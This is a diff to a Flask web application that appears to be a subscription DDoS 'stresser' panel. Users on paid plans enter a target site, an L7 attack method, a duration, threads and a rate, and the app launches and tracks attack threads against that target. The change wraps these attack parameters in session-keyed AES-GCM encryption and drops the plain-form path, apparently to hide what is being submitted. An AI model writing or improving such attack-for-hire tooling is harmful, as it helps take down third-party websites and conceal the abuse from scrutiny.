@@ -239,7 +239,29 @@ def get_profile():
 def issue_csrf():
     token = secrets.token_urlsafe(32)
     session[_CSRF_NAME] = token
+    # chave efêmera da payload (32 bytes) — só no server/session
+    session['payload_key'] = secrets.token_bytes(32)
+    session['payload_key_b64'] = base64.b64encode(session['payload_key']).decode()
     return token
+
+def payload_key_b64():
+    if 'payload_key_b64' not in session:
+        issue_csrf()
+    return session.get('payload_key_b64')
+
+def decrypt_payload_blob(blob_b64, iv_b64):
+    """AES-256-GCM: blob = ciphertext||tag (WebCrypto default)."""
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    key = session.get('payload_key')
+    if not key:
+        raise Exception("Sessão sem chave — recarregue")
+    iv = base64.b64decode(iv_b64)
+    data = base64.b64decode(blob_b64)
+    # WebCrypto AES-GCM appends 16-byte tag at end
+    pt = AESGCM(key).decrypt(iv, data, None)
+    import json
+    return json.loads(pt.decode('utf-8'))
+
 
 def validate_csrf():
     sent = request.form.get(_CSRF_NAME) or request.headers.get('X-CSRF-Token') or ''
@@ -560,9 +582,21 @@ def index():
             if not rate_limit_attack(4):
                 raise Exception("Rate limit: aguarde 1 minuto")
 
-            site = (request.form.get('site') or '').strip()
-            method = (request.form.get('method') or '').lower().strip()
-            t = int(request.form.get('time') or 0)
+            # payload criptografada (AES-GCM) — fallback form plain desativado
+            blob = request.form.get('blob')
+            iv = request.form.get('iv')
+            if not blob or not iv:
+                raise Exception("Payload inválida")
+            try:
+                data = decrypt_payload_blob(blob, iv)
+            except Exception as e:
+                raise Exception("Falha ao decifrar payload — recarregue") from e
+
+            site = (str(data.get('site') or '')).strip()
+            method = (str(data.get('method') or '')).lower().strip()
+            t = int(data.get('time') or 0)
+            threads = str(data.get('threads') or data.get('concs') or '1')
+            rate = str(data.get('rate') or '64')
 
             if not site:
                 raise Exception("Alvo obrigatório")
@@ -576,8 +610,7 @@ def index():
             if method not in L7_LOCAL_METHODS:
                 raise Exception("Método inválido. Use: " + ", ".join(L7_LOCAL_METHODS))
 
-            threads = request.form.get('threads') or request.form.get('concs') or "1"
-            atk = NATKMonitor(site, t, request.form.get('rate'), threads, method, session['user_id'], request.form.get('port'))
+            atk = NATKMonitor(site, t, rate, threads, method, session['user_id'], request.form.get('port'))
             atk.start()
             active_attacks[atk.attack_id] = atk
             get_db().execute(
@@ -590,11 +623,11 @@ def index():
         except Exception as e:
             return render_template(
                 'index.html', error=str(e), user_plan=lim,
-                local_methods=L7_LOCAL_METHODS, real_stats=g.real_stats, csrf_token=issue_csrf(),
+                local_methods=L7_LOCAL_METHODS, real_stats=g.real_stats, csrf_token=issue_csrf(), payload_key=payload_key_b64(),
             )
     return render_template(
         'index.html', user_plan=lim, local_methods=L7_LOCAL_METHODS,
-        real_stats=g.real_stats, csrf_token=issue_csrf(),
+        real_stats=g.real_stats, csrf_token=issue_csrf(), payload_key=payload_key_b64(),
     )
 
 @app.route('/status/<attack_id>')
